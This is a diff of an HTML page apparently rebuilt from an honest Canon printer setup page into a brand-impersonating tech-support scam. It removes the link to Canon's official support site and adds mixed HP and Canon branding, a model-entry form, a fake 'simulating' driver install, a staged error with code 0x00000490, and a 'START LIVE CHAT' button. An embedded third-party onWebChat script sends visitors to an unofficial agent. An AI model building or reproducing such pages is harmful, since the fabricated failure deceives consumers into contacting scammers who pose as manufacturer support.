@@ -1,14 +1,179 @@
 <!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="Canon Printer Setup and driver support."><title>Canon Printer Setup | Printer Setup</title><link rel="stylesheet" href="style.css"></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Set up your HP printer and find printer software and drivers.">
+  <title>Set Up Your CANON Printer</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>
+     
+.hp-logo img {
+  width: 100px;
+  height: auto;
+  object-fit: contain;
+}
+
+#canon{
+  /* background: linear-gradient(90deg, #ffffff 0%, #f5f5f5 45%, #e60012 100%); */
+  background: linear-gradient(90deg, #b80000, #ed1c24, #ff4545);
+  /* display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  padding: 8px 14px;
+  border-radius: 6px; */
+
+}
+/* #canon img{
+    width: 130px;
+  height: auto;
+  object-fit: contain;
+
+} */
+
+
+  </style>
+</head>
 <body>
-<header class="site-header"><div class="container nav-wrap"> <a class="brand" href="index.html">
-  <img src="logo.png" alt="Printer Setup Logo">
-  <span>CANON</span>
-</a><button class="menu-toggle" aria-label="Toggle navigation" aria-expanded="false">☰</button><nav class="nav-links"><a href="index.html">Home</a><a href="index.html#brands">Printer Brands</a><a href="index.html#services">Services</a><a href="index.html#faq">FAQs</a><a class="nav-cta" href="#brand-support">Get Support</a></nav></div></header>
-<main>
-<section class="brand-hero"><div class="container brand-hero-inner"><p class="eyebrow blue-eyebrow">PRINTER SETUP</p><h1>Canon Printer Setup</h1><p>Get your Canon printer ready to print. Follow the steps below to find the right official resources for your device.</p><div class="crumb"><a href="index.html">Home</a><span> / </span>Canon</div></div></section>
-<section class="brand-detail"><div class="container detail-grid"><div class="detail-card"><div class="brand-mark canon-mark">Canon</div><h2>Canon Driver &amp; Setup Help</h2><p>Visit Canon’s official support website and search for your model to find the correct manuals and software.</p><a class="button button-blue official-link" href="https://www.usa.canon.com/support" target="_blank" rel="noopener noreferrer">VISIT OFFICIAL SUPPORT <span>↗</span></a><p class="small-note">You will be taken to the manufacturer's official support website.</p></div>
-<div class="steps-card"><h2>Basic setup checklist</h2><ol><li><span>01</span><div><strong>Prepare your printer</strong><p>Connect the power cable, turn the printer on, and follow any setup prompts on its screen.</p></div></li><li><span>02</span><div><strong>Connect your device</strong><p>Use USB or connect the printer and computer to the same Wi-Fi network, as supported by your model.</p></div></li><li><span>03</span><div><strong>Find your exact model</strong><p>Check the label on the printer so you can select the correct model on the official support site.</p></div></li><li><span>04</span><div><strong>Install and test</strong><p>Follow the manufacturer's instructions, then print a test page to confirm everything works.</p></div></li></ol></div></div></section>
-<section class="brand-help" id="brand-support"><div class="container"><h2>Still need help?</h2><p>Return to the main page for common printer questions and additional setup information.</p><a class="button button-blue" href="index.html#faq">VIEW FREQUENTLY ASKED QUESTIONS <span>→</span></a><a class="back-link" href="index.html#brands">← Choose another printer brand</a></div></section>
+<header class="site-header">
+  <div class="header-inner">
+    <a class="hp-logo" href="#top" aria-label="HP home">
+      <img src="https://logos-world.net/wp-content/uploads/2020/08/Canon-Logo-1956-present.jpg">
+    </a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="index.html">Home</a><a href="#inkjet">Inkjet</a><a href="#laser">Laser</a><a href="#envy">Envy</a>
+    </nav>
+  </div>
+</header>
+<main id="top">
+  <section class="hero" id="canon">
+    <div class="hero-inner">
+      <div class="hero-copy">
+        <h1>Set Up Your CANON Printer</h1>
+        <p>Enter your CANON product name and model number to get the right CANON Smart software and drivers for you.</p>
+     
+
+        <form class="model-form" id="hpModelForm">
+  <label class="sr-only" for="printerModel">
+    Enter your CANON printer model
+  </label>
+
+  <input
+    id="printerModel"
+    name="printerModel"
+    type="text"
+    placeholder="HP Color LaserJet Pro M254dw"
+    required
+  >
+
+  <button type="submit">Next</button>
+</form>
+      </div>
+      <div class="hero-printer">
+        <img src="https://pisces.bbystatic.com/image2/BestBuy_US/images/products/6535/6535601ld.jpg" alt="HP printer printing a photo">
+      </div>
+    </div>
+  </section>
+  <section class="install-section">
+    <div class="install-inner">
+      <div class="install-copy">
+        <h2>Install CANON Smart software and drivers</h2>
+        <p>Install CANON Smart software and drivers on each mobile device or computer you want to print from. Add the printer on the new device.</p>
+        <p>Need additional help with setup? Visit <a href="#top" class="support-link">HP Support</a>.</p>
+      </div>
+      <div class="install-printer">
+        <img src="https://tse2.mm.bing.net/th/id/OIP.cYp38dFP8HAcNTQEqCjTpgHaEK?r=0&pid=Api&h=220&P=0" alt="">
+      </div>
+    </div>
+  </section>
 </main>
-<footer class="footer"><div class="container footer-inner"><a class="brand footer-brand" href="index.html">Printer <span>Setup</span></a><p>Printer setup information for home and office users.</p><p class="copyright">© 2026 Printer Setup. All rights reserved.</p></div></footer><script src="script.js"></script></body></html>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-columns">
+      <div class="footer-column"><h3>About Us</h3><a href="#top">Contact HP</a><a href="#top">Careers</a><a href="#top">Investor relations</a><a href="#top">Sustainable impact</a><a href="#top">Press center</a><a href="#top">The Garage</a></div>
+      <div class="footer-column"><h3>Ways To Buy</h3><a href="#top">Shop online</a><a href="#top">Call an HP rep</a><a href="#top">Find a reseller</a><a href="#top">Enterprise store</a><a href="#top">Public sector purchasing</a></div>
+      <div class="footer-column"><h3>Support</h3><a href="#top">Download drivers</a><a href="#top">Support &amp; troubleshooting</a><a href="#top">Community</a><a href="#top">Register your product</a><a href="#top">Authorized service providers</a><a href="#top">Check repair status</a><a href="#top">Training &amp; certification</a><a href="#top">Fraud alert</a><a href="#top">Security Center</a></div>
+      <div class="footer-column"><h3>HP Partners</h3><a href="#top">HP Amplify Partner Program</a><a href="#top">HP Partner Portal</a><a href="#top">Developers</a></div>
+      <div class="footer-column"><h3>Useful Links</h3><a href="#top">Recalls</a><a href="#top">Product recycling</a><a href="#top">Accessibility</a><a href="#top">CA Supply Chains Act</a><a href="#top">Site Map</a><a href="#top">Privacy</a><a href="#top">Use of cookies</a><a href="#top">Personal data rights</a><a href="#top">Terms of use</a><a href="#top">Limited warranty statement</a><a href="#top">Terms &amp; conditions of sales &amp; service</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p class="copyright">◆ Copyright All Right Reserved.</p>
+      <form class="subscribe-form" id="subscribeForm">
+        <label class="sr-only" for="emailAddress">Your email address</label>
+        <input type="email" id="emailAddress" placeholder="Your Email address" required>
+        <button type="submit">SUBSCRIBE</button>
+      </form>
+    </div>
+  </div>
+</footer>
+
+
+
+
+
+
+
+<!-- Installation Preview Popup -->
+<div class="driver-modal" id="driverModal" aria-hidden="true">
+  <div class="driver-modal-box" role="dialog" aria-modal="true"
+       aria-labelledby="driverModalTitle">
+
+    <button type="button" class="driver-close" id="driverClose"
+            aria-label="Close popup">&times;</button>
+
+    <div id="driverProgressView">
+      <p class="driver-status">Software is downloaded or installed</p>
+
+      <h2 id="driverModalTitle">Printer Driver Installation Preview</h2>
+      <p class="driver-model" id="driverModelName">HP printer</p>
+
+      <p class="driver-simulating" id="driverStatusText">
+        Simulating driver installation…
+      </p>
+
+      <div class="driver-progress-track">
+        <div class="driver-progress-fill" id="driverProgressFill"></div>
+      </div>
+
+      <p class="driver-progress-number" id="driverProgressNumber">0%</p>
+    </div>
+
+    <div id="driverErrorView" hidden>
+      <div class="driver-error-icon">!</div>
+      <h2 class="driver-error-title">Printer Driver Installation Interrupted</h2>
+
+      <p>
+        An error occurred while attempting to install the printer driver.
+      </p>
+
+      <ul class="driver-error-details">
+        <li><strong>Error:</strong> Installation could not be completed.</li>
+        <li><strong>Error Code:</strong> 0x00000490</li>
+        <li><strong>Status:</strong> Printer connection and driver installation have not been verified.</li>
+      </ul>
+
+      <h3 class="driver-support-heading">SUPPORT OPTIONS</h3>
+      <p class="driver-support-message">Need Help? Contact Support</p>
+
+      <button type="button" class="driver-chat-button" id="driverChatButton">
+        START LIVE CHAT
+      </button>
+    </div>
+
+  </div>
+</div>
+
+
+<script src="/popup.js"></script>
+
+
+<script type='text/javascript'>
+var onWebChat={ar:[], set: function(a,b){if (typeof onWebChat_==='undefined'){this.ar.
+push([a,b]);}else{onWebChat_.set(a,b);}},get:function(a){return(onWebChat_.get(a));},
+w:(function(){ var ga=document.createElement('script'); ga.type = 'text/javascript';
+ga.async=1;ga.src=('https:'==document.location.protocol?'https:':'http:') + 
+'//www.onwebchat.com/clientchat/9d0cf6f6f0f611356cc5a4c91b7046b9';var s=
+document.getElementsByTagName('script')[0];s.parentNode.insertBefore(ga,s);})()}
+</script>
+</body>
+</html>
